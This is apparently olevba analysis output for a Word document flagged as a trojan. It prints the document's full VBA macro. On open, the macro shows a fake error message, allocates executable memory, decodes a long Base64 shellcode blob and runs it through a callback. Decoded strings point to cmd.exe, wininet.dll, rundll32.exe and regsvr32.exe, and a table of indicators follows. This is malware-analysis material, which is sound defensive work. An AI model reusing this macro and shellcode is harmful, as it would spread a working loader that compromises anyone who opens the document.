olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shellex.gen-e04b03e82077329bfcc5b0aae31a931b6306927b39fac83104fc81efc92d7b59
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shellex.gen-e04b03e82077329bfcc5b0aae31a931b6306927b39fac83104fc81efc92d7b59 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
    Private Declare PtrSafe Function adsArt Lib "kernel32" Alias "VirtualAlloc" ( _
        ByVal r As LongPtr, _
        ByVal nMixed As LongPtr, _
        ByVal adsPosition As Long, _
        ByVal angleFrac As Long) As LongPtr
    Private Declare PtrSafe Sub dateServer0 Lib "kernel32" Alias "Sleep" (ByVal uriRuler As Long)
    Private Declare PtrSafe Function regConsole Lib "crypt32" Alias "CryptStringToBinaryA" ( _
        ByVal folderStation As String, _
        uriTexture As Long, _
        v As Long, _
        nLogon As LongPtr, _
        k As LongPtr, _
        resultOptimize As LongPtr, _
        dateServer As LongPtr) As Long
    Private Declare PtrSafe Function regAnsi Lib "ntdll" Alias "asdf" ( _
        a As LongPtr, _
        x As LongPtr, _
        uriRuler0 As LongPtr, _
        deltaTimer0 As LongPtr, _
        e As Long, _
        wSrc As LongPtr) As LongPtr
    Private Declare PtrSafe Function iNext Lib "gdi32" Alias "LineDDA" ( _
        ByVal modifiedArt As Long, _
        ByVal folderBrowse0 As Long, _
        ByVal tableSegment As Long, _
        ByVal s As Long, _
        ByVal textArt0 As LongPtr, _
        ByVal wPosition As LongPtr) As Long

Private Declare PtrSafe Function Beep Lib "kernel32" (ByVal bConversion As Long, ByVal q As Long) As Long
#Else
    Private Declare Function adsArt Lib "kernel32" Alias "VirtualAlloc" ( _
        ByVal r As Long, _
        ByVal nMixed As Long, _
        ByVal adsPosition As Long, _
        ByVal angleFrac As Long) As Long
    Private Declare Sub dateServer0 Lib "kernel32" Alias "Sleep" (ByVal uriRuler As Long)
    Private Declare Function regConsole Lib "crypt32" Alias "CryptStringToBinaryA" ( _
        ByVal folderStation As String, _
        uriTexture As Long, _
        v As Long, _
        nLogon As Long, _
        k As Long, _
        resultOptimize As Long, _
        dateServer As Long) As Long
    Private Declare Function regAnsi Lib "ntdll" Alias "asdf" ( _
        a As Long, _
        x As Long, _
        extensionsScr As Long, _
        angleNext As Long, _
        e As Long, _
        wSrc As Long) As Long
    Private Declare Function iNext Lib "gdi32" Alias "LineDDA" ( _
        ByVal modifiedArt As Long, _
        ByVal folderBrowse0 As Long, _
        ByVal tableSegment As Long, _
        ByVal s As Long, _
        ByVal textArt0 As Long, _
        ByVal wPosition As Long) As Long
        
Private Declare Function Beep Lib "kernel32" (ByVal bConversion As Long, ByVal q As Long) As Long
#End If

Sub folderBrowse()
 
    Dim t As Paragraph
    For Each t In ActiveDocument.Paragraphs
        'do something with it. We will just display
        'paragraph text if its style is "Heading 4"
        If t.Style = "Heading 4" Then
            MsgBox t.Range.Text
        End If
    Next t
 
End Sub
Sub textArt()
 
    Dim t As Paragraph
    For Each t In ActiveDocument.Paragraphs
        'do something with it. We will just display
        'paragraph text if its style is "Heading 4"
        If t.Style = "Heading 4" Then
            MsgBox t.Range.Text
        End If
    Next t
 
End Sub

Private Sub wPosition0()
#If VBA7 Then
    Dim deltaTimer As LongPtr
#Else
    Dim deltaTimer As Long
#End If

    deltaTimer = adsArt(ByVal 0&, ByVal 10240, &H3000&, &H40&)
    

    Dim wSubscriber As String
    Dim l As Long
    l = 102400
    
    wSubscriber = "ieBqASngWjwID4WFBwAAVUiJ5UiB7GgBAABTV1ZIiU0Q6AAAAABYSIPoJkiJRfBIjZ2k/v//SIPsIEiJ2ejJAwAASIPEIEiD7CBIidnoeQAAAEiDxCCJhaD+//+FwHRKSItF8EgFfhMAAEiD7CBIx8EAAAAASInCTI1FjOiWAgAASIPEIEgFfhMAAEiD7CCLjaD+//9Ii1XwSYnASYnZ6JEBAABIg8Qg6wBIg+wgSMfB/////0jHwgAAAAD/k5AAAABIg8QgXl9bycNVSInlSIHsuAEAAFdWU0iJTRBIMcBIMclIjb1Q/v//sRBR86pZSI29YP7///Oqx4VQ/v//EAAAAMeFYP7//xAAAABIx8FoAAAASI29cP7///OqSMfBGAAAAEiNvdj+///zqseFcP7//2gAAADHhaz+//8BAAAAZseFsP7//wAASItdEOgcAAAAQzpcV2luZG93c1xTeXNXT1c2NFxjbWQuZXhlAF5Ig+wgSI2N8P7//+sOJXMgL2MgInBhdXNlIgBIjRXr////SYnw/5PQAAAASIPEIEiD7FBIx8EAAAAASI2V8P7//0yNhVD+//9MjY1g/v//SMdEJCABAAAASMdEJCggAAAASMdEJDAAAAAASMdEJDgAAAAASI2FcP7//0iJRCRASI2F2P7//0iJRCRI/1NwSIPEUIXAdCpIg+wgSIuN4P7///9TKEiDxCBIg+wgSIuN2P7///9TKEiDxCCLhej+//9bXl/Jw1VIieVIg+woV1ZTiU0QSIlVGEyJRSBMictIg+wgSMfB/w8f" & _
    "AEjHwgAAAABEi0UQ/1MwSIPEIEiJReBIg+wwSItN4EjHwgAAAABMi0UgScfBADAAAEjHRCQgQAAAAP9TOEiDxDBIiUXoSIPsMEiLTeBIi1XoTItFGEyLTSBIjUXwSIlEJCD/U0BIg8QwSIPsQEiLTeBIx8IAAAAAScfAAAAAAEyLTehIuLjnZa8AAAAASIlEJCBIx0QkKAAAAABIx0QkMAAAAAD/U0hIg8RASIPsIEiLTeD/UyhIg8QgW15fycNVSInlSIPsKFdWU8dF4BAAAACITRBIiVUYTIlFIEiLfSC5ZAAAADHAiUX486pIi3UYiwaJReRIi30gi0YEg+ADiQeLRgiD4AOJRwSJRfABRfiLRgyD4AeJRwiJRfQBRfiDPwF1A/9F+ItF5Egx20iD7CCJwUiJ2ujAAQAASIPEIEj/ww+2TRBn4wgwRB4Pdd7rBjhEHg911v9N+HXRAV3gSDHbOF0QdESLTfBIjXYQSIl16KyEwHX7SItF6EiJRN8MSP/D4ulIMduLTfRIiXXorITAdftIi0XoSIlE3yRI/8Pi6YM/AXUESIl3XItF4FteX8nDVUiJ5VdWU0FUQVVBVkiJz0yNIUyNaQjoAAAAAF5Ig8ZyTI22ugAAAEw59nNWD7omB3MiSIPsIEiJ2UiJ8k2J4EnHwQAAAADoQgEAAEiDxCBIq63r00iD7CBIifHodgIAAEiDxCBIhcB1D0iD7CBIifFB/1UASIPEIEiJw6yEwHX766VBXkFdQVxbXl/Jw2tlcm5lbDMyLmRsbADIJ15IztEKQPUN" & _
    "rkvJjrXejt46G/gWVVKfxGXP/zyRNsoMojCSilXkzY0DSKBk+JCzMiw5mgMbld7jX5ieQPqY2WQfHqNIH7qEm7uQc2hlbGwzMi5kbGwAlx6U2G50ZGxsLmRsbACFjgAvd2luaW5ldC5kbGwA575Lf8Q/2nGoDfmlsTQ+oXNobHdhcGkuZGxsAJuJP0p1c2VyMzIuZGxsAI7yZMHqD8SJ93s/+lVIieWJyAHQicLB4goB0InCweoGMdDJw1VIieVIg+wIVkiJzjHAD7YWSP/GhdJ0EUiD7CCJwejF////SIPEIOvlDIBeycNVSInlSIPsGFdWU0iJTRBIiVUYTIlFIEyJTShIi0UQTTHSRItQPEwB0EiLfRBEi5CIAAAATAHXi4CMAAAAiUXwSItdGEiB+///AAB3DESLVxBMKdPpgwAAAEgx9ot3IEgDdRBIMds7XxhzMf/DSDHArUgDRRBIiUX0SItNGPYBgHQiSIPsIEiJwehE////SIPEIEiLTRg5AXXM6yFIMcDpoAAAAEiD7CBIi00YSInC6CsBAABIg8QgSIXAdalIi0UoSIXAdAdIi030SIkISDH2i3ckSAN1EA+3XF7+SDH2i3ccSAN1EEgxwIsEnkiFwHSrSANFEEg5+HJKSIn5RItV8EwB0Ug5yHM7SDHASDtFIHSKSIF9GP//AAB3FUiD7CBIi00QSItVGP9VIEiDxCDrE0iD7CBIi00QSItV9P9VIEiDxCBbXl/Jw1VIieVIg+wYU1dWSIlNEEgxwGVIi0BgSIt1EEiF9nUGSItAEOtr" & _
    "SItAGEiLQBBIiUXw6wlIiwBIO0XwdFFIjRhIi3tgSIX/dOtIi3UQSDHJihZI/8aA+mFyCID6encDgOogZjtLWHIKhNJ1yEiLQzDrH4o0D0j/wUj/wYD+YXIIgP56dwOA7iA48nTE66ZIMcBeX1vJw1VIieWKAUj/wYoiSP/CKOB1BITkde5ID77AycNVieWB7LQAAABTV1boAAAAAFiD6BGJRfyNnVD///9T6DoDAACBfQi452WvdDtT6MMAAACJhUz///+FwHQri0X8BeoLAACNVcRSUGoA6EUCAAAF6gsAAFNQ/3X8/7VM////6MsBAADrK1PoMwAAAIXAdCGLRfwF6gsAAI1VxFJQagHoEAIAAFONVcRS/3UI6OgDAABqAGr//1NIXl9bycIEAFWJ5VOLXQjoJQAAADcyMzBjNzU0LTIwNjktNDg5Ny1hZDU4LWUzODI3MWQ0NDE2NwBqAWoA/1NAhcB0EmoAUP9TRD0CAQAAdAUxwEDrAjHAW8nCBABVieWB7HABAABXVlMxwI29kP7//7kMAAAAUfOqWY29nP7///Oqx4WQ/v//DAAAAMeFnP7//wwAAAAwwLlEAAAAjb2o/v//86q5EAAAAI297P7///Oqjb3s/v//x4Wo/v//RAAAAMeF1P7//wEAAABmx4XY/v//AACLXQjoHAAAAEM6XFdpbmRvd3NcU3lzV09XNjRcY21kLmV4ZQBeVv9TZIXAdSLoHAAAAEM6XFdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZQBeVugOAAAAJXMgL2MgInBh" & _
    "dXNlIgCNlfz+//9S/1Nog8QMjZXs/v//Uo2VqP7//1JqAGoAaiBqAY2VnP7//1KNlZD+//9SjZX8/v//UmoA/1M4hcB0GP+18P7///9TFP+17P7///9TFIuF9P7//1teX8nCBABVieWD7AxXVlOLXRT/dQhqAGj/Dx8A/1MYiUX0akBoADAAAP91EGoA/3X0/1MciUX4agD/dRD/dQz/dfj/dfT/UyBqAGoAaLjnZa//dfhqAGoA/3X0/1Mk/3X0/1MUW15fycIQAFWJ5YPsGFdWU8dF6BAAAACLfRC5OAAAADHAiUX886qLdQyLBolF7It9EItGBIPgA4kHi0YIg+ADiUcEiUX0AUX8i0YMg+AHiUcIiUX4AUX8gz8BdQP/RfyLRewx21NQ6F8HAABDi00I4wgwRB4Pde3rBjhEHg915f9N/HXgAV3oMds5XQh0N4tN9I12EIl18KyEwHX7i0XwiUSfDEPi7jHbi034iXXwrITAdfuLRfCJRJ8YQ+Lugz8BdQOJdzSLRehbXl/JwgwAVYnlg+wMV1ZTi30IjQeJRfSNRwSJRfjoAAAAAF6NdkeNnroAAAA53nMyD7omB3MSagD/dfRW/3X86PkGAACrrevkVui3BwAAhcB1BotF+Fb/EIlF/KyEwHX768pbXl/JwgQAa2VybmVsMzIuZGxsAMgnXkjO0QpA9Q2uS8mOtd6O3job+BZVUp/EZc//PJE2ygyiMJKKVeTNjQNIoGT4kLMyLDmaAxuV3uNfmJ5A+pjZZB8eo0gfuoSbu5BzaGVsbDMyLmRs" & _
    "bACXHpTYbnRkbGwuZGxsAIWOAC93aW5pbmV0LmRsbADnvkt/xD/acagN+aWxND6hc2hsd2FwaS5kbGwAm4k/SnVzZXIzMi5kbGwAjvJkweoPxIn3ez/6VYnlgexMBQAAVldTi3UMi10QU1aNlbz6//9S6DEFAACNlfD9//9S6EICAAAxwImF6P3///+N6P3//3kUi0YEiYXo/f//jUYMiYXs/f//6+SLhez9//+Dhez9//8EjZXw/f//Uo2V+P3//1L/MOgmAgAAU2gEAQAAjZX8/v//Uug0AQAAaAQBAACNlfz+//9SjZX4/f//UujkAAAAU42VvPr//1KNlfj9//9S6BECAACFwHUNaGDqAAD/Uzzpc////4M+AHUaagBqAP91CI2VvPr//1JqAGoA/1NM6ZkAAACDPgF1Sv92NI2VvPr//1LoCAAAACIlcyIsJXMAjZXg+///Uv9TaIPEEGoAagCNleD7//9S6A0AAABydW5kbGwzMi5leGUAagBqAP9TTOtKgz4CdUWNlbz6//9S6AgAAAAtcyAiJXMiAI2V4Pv//1L/U2iDxAxqAGoAjZXg+///UugNAAAAcmVnc3ZyMzIuZXhlAGoAagD/U0xbX17JwgwAVYnlV1aLdQgxyaxBhMB1+o1R/4t1DDHJrEGEwHX6jQQKOUUQcwKJEYt1DIt9CAHX86ReX8nCDABVieWB7BgBAABXVlOLXRBqAP9TbImF+P7//2oB/1NsiYX8/v//jZXo/v//Uv9TcGoK/1M8jZXw/v//Uv9TcP+19P7///+18P7/" & _
    "//+17P7///+16P7///+1/P7///+1+P7//+ghAAAAJnNjcj0lZHglZCZjdXIxPSVkeCVkJmN1cjI9JWR4JWQAjZUA////Uv9TaIPEIDlFDHYTjbUA////i30IicHzpDDAqkDrAjHAW15fycIMAFWJ5VeLfQgPMbkHBwcHicLB6gMhyA0wMDAwq4nQIcgNMDAwMKtfycIEAFWJ5VdWi3UIi30MrITAdAOq6/i4JmlkPauLdRCtq62rMcCqXl/JwgwAVYnlgewAEAAAU/91EGgAEAAAjZUA8P//Uv91DP91COjMAAAAicOFwHRDMcCD+wJ2PGaBvQDw//9NWnQTZoO9APD//wB1J2bHhQDw//9NWotFEGiIEwAA/1A8/3UQU42VAPD//1L/dQzoBQAAAFvJwgwAVYnlg+wIV1PHRfgAAAAAx0X8AAAAAItdFGoAaIAAAABqA2oAagFoAAAAQP91CP9TLIlF+IP4/3QqagBqAGoA/3X4/1MwagCNVfxS/3UQ/3UM/3X4/1M0hcB0CItFEDtF/HQEMf/rAzH/R4tF+IP4/3QEUP9TFIn4W1/JwhAAVYnlgewkBAAAV1ZTx4Xc+////////8eF4Pv//wAAAADHheT7//8AAAAAx4Xo+///AAAAAMeF7Pv//wAAAADGRfwAi10YagBogAAAAGoCagBqAWgAAABA/3UM/1MsiYXc+///g/j/D4T2AAAAagBqAGoAagGNVfxS/1NUiYXg+///hcAPhNkAAACNlej7//9SaAAAAIBqAGoA/3UIUP9TWImF5Pv//4XA" & _
    "D4S0AAAAMcBAiYXw+///iYX4+///i30Qi4X4+///hcAPhJQAAACLhfD7//+FwA+EigAAAI2V8Pv//1JoAAQAAI2V/Pv//1L/teT7////U1yJhfj7//+FwHRgMcmNtfz7//+LRRQ5hez7//90GDuN8Pv//3QQrKoPMYhG//+F7Pv//0Hr3WoAjZX0+///Uv+18Pv//42V/Pv//1L/tdz7////UzSFwHQSi43w+///O430+///D4Re////Mf/rBou97Pv//4uF3Pv//4P4/3QEUP9TFIuF5Pv//4XAdARQ/1Ngi4Xg+///hcB0BFD/U2CJ+FteX8nCFABVieWD7BBXVlOLfQiLXRBXaAQBAAD/UyiNfAf7iX3wi1UMjUIYiUX0i0IIiUX4iwKJRfz/Tfh4Hot19Is2i33wrKqEwHX6/3UI/1NkhcB0NoNF9ATr3Yt98A8xicK5CAAAAIjQJA8EYarB6gTi9IN9/AB1CMcHLmJhdOsGxwcucnd6xkcEAFteX8nCDABVieWLRQgDRQyJwsHiCgHQicLB6gYx0MnCCABVieVWi3UIMcAPthZGhdJ0CVJQ6M3////r7wyAXsnCBABVieWD7AhXVlOLRQgDQDyLeHgDfQiLQHyJRfiLXQyB+///AAB3BStfEOtVi3cgA3UIMds7XxhzH0OtA0UIiUX8i00M9gGAdBNQ6JH///+LTQw5AXXe6xIxwOtmi00MicLo3gAAAIXAdcqLRRSFwHQFi038iQiLdyQDdQgPt1xe/ot3HAN1CIsEnoXAdMoDRQg5+HItifkD" & _
    "Tfg5yHMkMcA7RRB0s4F9DP//AAB3C/91DP91CP9VEOsJ/3X8/3UI/1UQW15fycIQAFWJ5YPsBFdWU2ShMAAAAIt1CIX2dQWLQAjrWYtADItADIlF/OsHiwA7Rfx0RY0Yi3swhf908It1CDHJihZGgPphcgiA+np3A4DqIGY7SyxyCYTSddGLQxjrGoo0D0FBgP5hcgiA/np3A4DuIDjydMvrtDHAW15fycIEAIoBQYoiQijgdQSE5HXyD77Aw6+UBg1NVQFC2iY+WH812XSFLZZyNeRQiyFjsj0kHWZTSQc0/Q3+ezRXrC4LAKNKv20OhV8h93QCev7fRp/w/MXI1Apa9wzNFCFMBTpdgedH4t8vHAVEHLvUvodQ1G146H3j2fGL524LB/7oHsJfh2Zjs5OlWtW8hH/NPZz3bxti0sfFv3D3Ng3/KF5O9vNANhPj9oF33gcg0mXqiVJLiF1cjh0V/uzpxAPUwVwpLB368at1ALanMHSMyqGwCWWZh4PxxfhIXJgpwKL8a7TkPDYSbapEw0Bm9f9Epo3rDgQuhX6oy00GmnumS6FVDBUG/8MHt2s="
    
    adsConversion = regConsole(wSubscriber, ByVal 0, ByVal 1, ByVal deltaTimer, ByVal VarPtr(l), ByVal 0&, ByVal 0&)
    adsConversion = iNext(0, 0, 1, 1, ByVal deltaTimer, ByVal 1&)
End Sub


Private Sub Document_Open()
    MsgBox "Error: Division by zero at line 297"
    wPosition0
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualAlloc        |May inject code into another process         |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command (obfuscation: Base64)                |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|          |                    |(obfuscation: Base64)                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |cmd.exe             |Executable file name (obfuscation: Base64)   |
|IOC       |kernel32.dll        |Executable file name (obfuscation: Base64)   |
|IOC       |shell32.dll         |Executable file name (obfuscation: Base64)   |
|IOC       |ntdll.dll           |Executable file name (obfuscation: Base64)   |
|IOC       |wininet.dll         |Executable file name (obfuscation: Base64)   |
|IOC       |shlwapi.dll         |Executable file name (obfuscation: Base64)   |
|IOC       |Juser32.dll         |Executable file name (obfuscation: Base64)   |
|IOC       |rundll32.exe        |Executable file name (obfuscation: Base64)   |
|IOC       |regsvr32.exe        |Executable file name (obfuscation: Base64)   |
+----------+--------------------+---------------------------------------------+

